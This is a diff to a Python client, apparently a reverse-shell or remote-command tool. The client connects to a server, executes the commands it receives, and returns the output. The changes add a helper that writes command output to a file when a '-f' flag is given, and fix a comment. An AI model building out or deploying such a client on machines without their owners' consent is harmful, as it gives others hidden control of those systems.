@@ -10,7 +10,7 @@ GlobalOverwriteOutput = None
 
 SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 5003
-BUFFER_SIZE = 1024 * 1024 # 1mb max size for commands, feel free to increase
+BUFFER_SIZE = 1024 * 1024 # 1MB max size for commands, feel free to increase
 SEPARATOR = "<sep>"
 def RunCommand(command):
     # Should be error prove command running function
@@ -76,6 +76,17 @@ def RecursiveScan(directory, max_depth, current_depth=0):
     
     return items
 
+
+# Support functions
+def WriteToFile(filename, data):
+    try:
+        with open(filename, 'w') as file:
+            file.write(data)
+        return f"Data written to {filename}"
+    except PermissionError:
+        return f"Permission denied to write {filename} to {os.getcwd()}"
+    except Exception as e:
+        return f"Error writing to file {filename}: {e}"
 
 
 
@@ -160,8 +171,16 @@ def EstablishConnection():
                     output = ""
                 found = True
             if found == False:
+                if splited_command[-1].lower() == "-f":
+                    # remove the last element from the command
+                    command = ' '.join(splited_command[:-1])
                 # execute the command and retrieve the results
                 output = RunCommand(command)
+            
+
+            # Check for flags
+            if splited_command[-1].lower() == "-f":
+                output = WriteToFile("output.txt", output)
             # get the current working directory as output
             cwd = os.getcwd()
             # send the results back to the server
